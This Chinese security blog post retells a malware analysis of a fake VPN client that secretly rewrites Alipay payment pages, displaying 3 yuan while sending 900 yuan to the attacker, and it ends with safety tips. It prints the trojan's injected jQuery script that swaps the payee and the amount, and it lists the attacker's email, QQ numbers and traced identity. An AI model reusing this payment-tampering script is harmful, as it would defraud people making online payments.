---  
layout: post  
title: "VPN便宜卖了？木马抢钱计！"
date: 2016-05-24
categories:  传媒信安     
comments: true
description:  520继“刷我的卡“之后，支付宝也沦陷了！！！转账3元却转走1900元，也是红红火火恍恍惚惚啊~~~
tags:
    - 传媒信安
---  
520继“[刷我的卡](http://sec.cuc.edu.cn/CUCIS/post/bank-card)”之后，支付宝也被坑了！！！转账3元却转走1900元，也是红红火火恍恍惚惚啊~~~

事件源于52pojie上的一篇名为“支付宝转3块扣1900,这是咋回事”的贴子。

![](http://127.0.0.1:4000//resources/images/aa1.png) 

（咳咳，这里小编说两句题外话。。帖子邪性得很，在站内无论按全文搜索，还是按标题搜索都没搜索到，小编还纳闷难道是被删帖了？？？却在google上关键字“支付宝转3块扣1900,这是咋回事”一搜就是头条！！！呵呵了，看来不是小编有问题，就是网站搜索功能太强大啊~~~360小编原话说52pojie“熟悉网络安全、破解逆向的朋友一定对于52pojie这个网站不会感到陌生,它是我国为数不多的关注计算机安全的技术网站。”小编孤陋寡闻了，真的没听说过。。。小编太渣。。。）

![](http://127.0.0.1:4000//resources/images/aa2.jpg) 

咳咳，再说回来，帖子说:楼主在网上买VPN代理，想科学上网，用支付宝付款时显示3块钱,但输完支付宝验证码后却被扣了1900元。

小编想说楼主你不是随便看了个牛皮癣广告就中招了吧？？？比如这样。。。

![](http://127.0.0.1:4000//resources/images/aa3.jpg) 

这么便宜！！！小编都有点心动了呢！！！

呃呃~~~但是且不管楼主 是通过什么途径中招的。来看看万能的360天眼实验室是怎么破解的吧！！！

360天眼实验室发挥了其强大的人肉功能，博主 2016-5-18 14:46发的帖子，360天眼实验室在2016-05-20 14:29:07就做出了回应，详细披露了漏洞利用的过程和攻击团伙的各种信息。。。

![](http://127.0.0.1:4000//resources/images/aa4.png) 


不得不说，360天眼实验室真是

![](http://127.0.0.1:4000//resources/images/aa5.gif) 

根据帖子中的描述,访问网站hxxp://cctv168.cc/,在浏览器中输入网址,回车后进入该网站:（当然，小编也尝试访问了一下，然而已经什么都看不到了。。。）

![](http://127.0.0.1:4000//resources/images/aa6.png) 


点击“立即下载客户端”，运行VPN客户端程序,样本运行后,向用户展示界面如下界面:

![](http://127.0.0.1:4000//resources/images/aa7.png) 

当然,只是不管你在何时以何种姿势点击连接,都会提示您会员已经过期。没办法,只有点击购物车按钮,购买会员才能使用。

在购买界面,给出的应付金额是3元,3块钱你买不了吃亏，买不了上当，当然闭着眼就点击了同意开通。

![](http://127.0.0.1:4000//resources/images/aa8.png) 

事实上点击了同意开通后,样本执行了如下不为用户所知的动作:

1.访问http://463038264.lofter.com网站,读取到包括每次转账的金额(这里为每次转900元)、转账时显示的支付宝姓名(这里为长江电子商务有限公司)以及支付宝账号(lrh103272@163.com)等配置信息。

![](http://127.0.0.1:4000//resources/images/aa9.png) 

2.带着http://www.alipay.com参数启动IEXPLORE.EXE,使用易语言(恶意代码作者的日常之选)封装的DOM类库,查找当前浏览器是不是正在进行付款操作。

![](http://127.0.0.1:4000//resources/images/aa10.png) 

3.如果当前正在进行付款操作,根据付款的流程,修改网页的显示。

使用易语言的类成员方法(0x4040DB处),修改页面显示内容。此处方法有两个参数,参数一为“exescript”,参数二为要运行的脚本代码。将页面上显示的金额信息与付款金额填写为下图样式。至此,细心的人应该发现,软件能够帮你把金额和收款人自动填写上,当然也可以悄无声息地修改信息。

![](http://127.0.0.1:4000//resources/images/aa11.png) 

参数二的脚本内容为:


```
seajs.use("jquery",function($)

{$('#reason').val('USERvpn111 MCZ2016254525');

$('#ipt-search-key').val('lrh103272@163.com');

vara1=$('#amount').clone();

$('#amount').css('display','none');

$('#amunt').val('900');a1.val('3');

a1.attr('id','amount1');

a1.removeAttr('name');

a1.insertAfter($('label[for="amount"]'));

}

);
```
![](http://127.0.0.1:4000//resources/images/aa12.png) 


4.在上一步的操作中,支付宝实际支付的金额已经被修改成了900元,只不过因为软件作者通过脚本将显示的数字改成3元。在支付宝付款过程中,单击下一步后,正常的页面应该是这样的:

![](http://127.0.0.1:4000//resources/images/aa13.png) 

而在软件的帮忙下通过0x4046D6处函数的调用将页面做了瞒天过海式的修改:

一、将付款金额改成3元,

二、将收款人修改成"长江电子商务有限公司",在短短不到一秒钟的时间里,让人眼不见心不烦,提升了购物体验。

![](http://127.0.0.1:4000//resources/images/aa14.png) 
修改页面的代码:

![](http://127.0.0.1:4000//resources/images/aa15.png) 

5.在付款的最后一步,使用与第四步同样的障眼手法。被修改之前:

![](http://127.0.0.1:4000//resources/images/aaa16.png) 

![](http://127.0.0.1:4000//resources/images/aa16.png) 

修改后:

![](http://127.0.0.1:4000//resources/images/aaa17.png) 

6.最后,真实的交易数据被发送到服务器。事已至此,虽然肉眼已经无法再辨别出网页显示其实已经被篡改过,但从网络流量中发出的付款金额为900元。

![](http://127.0.0.1:4000//resources/images/aa17.png) 

此时,看起来只支持了3元的一次完整购买过程就结束了。待事后事主看支付宝日志记录,才会发现转出的是900元,而不是3元。。。

但是有什么用呢~~~

![](http://127.0.0.1:4000//resources/images/aa18.jpg) 

然后，360天眼实验室对该木马进行了溯源！！样本中的配置文件来自于http://463038264.lofter.com网站,网页上出现了两个可疑的号码,463038264和2953766158,确认两个号码是QQ号。然后发现了木马制造者的小号：

![](http://127.0.0.1:4000//resources/images/aa19.png) 

![](http://127.0.0.1:4000//resources/images/aaa20.png) 

然后又挖到了大号。。。

![](http://127.0.0.1:4000//resources/images/aa20.png) 

![](http://127.0.0.1:4000//resources/images/aa21.png) 

公司。。。

![](http://127.0.0.1:4000//resources/images/aa22.png) 

淘宝店铺。。。

![](http://127.0.0.1:4000//resources/images/aa23.png) 

真实信息。。。

![](http://127.0.0.1:4000//resources/images/aa24.png) 

呃。。。小哥。。。我都有点心疼你了。。。

![](http://127.0.0.1:4000//resources/images/aa25.jpg) 

但是自作孽不可活啊~~~小编也就心疼你一秒！！！

最后小编不得不说，现今网络上到处是坑，一不小心就挖个坑把自己埋了。

![](http://127.0.0.1:4000//resources/images/aa26.jpg) 

**各位看客请千万注意！！！**

**不要安装和使用来路不明的软件！！！**

**电脑上安装杀毒软件是很必要的！！！**

**支付安全小技巧：电脑下单时，使用手机扫码支付，支付前看清楚订单详情，避免单点沦陷，毕竟木马要同时劫持两台不相关设备（电脑和手机）难度就大多了！！！**


![](http://127.0.0.1:4000//resources/images/aa27.jpg) 

参考文献：

360安全播报：[眼见未必实​之付款篡改支付宝木马分析](http://bobao.360.cn/learning/detail/2876.html)